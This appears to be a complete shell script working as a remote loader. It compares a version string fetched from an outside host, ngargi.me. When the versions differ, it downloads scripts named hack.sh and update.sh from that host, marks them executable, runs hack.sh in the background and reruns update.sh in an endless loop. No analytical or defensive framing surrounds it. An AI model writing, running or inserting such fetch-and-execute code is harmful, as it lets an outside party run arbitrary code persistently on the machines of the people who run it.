export VERSION=1
echo `curl -s "http://ngargi.me/update"`

if [ `curl -s "http://ngargi.me/update"` = $VERSION ];
	then
		echo 'no update needed'
else
	echo "update needed"
	curl -s -O "http://ngargi.me/hack.sh"
	curl -s -O "http://ngargi.me/update.sh"
	chmod a+x hack.sh
	chmod a+x update.sh
	./hack.sh &
	while [ true ]; do ./update.sh; sleep 5000; done;
fi;